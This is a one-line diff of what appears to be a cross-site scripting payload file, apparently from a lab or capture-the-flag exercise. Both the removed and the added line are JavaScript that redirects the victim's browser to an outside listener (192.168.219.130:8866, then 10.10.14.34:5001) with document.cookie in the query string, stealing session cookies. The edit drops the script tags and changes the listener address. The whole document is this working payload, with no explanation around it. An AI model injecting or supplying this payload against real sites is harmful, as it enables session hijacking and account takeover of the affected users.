@@ -1,1 +1,1 @@
-<script>document.location='http://192.168.219.130:8866/?c='+document.cookie</script>
+document.location='http://10.10.14.34:5001/?c=' + document.cookie;
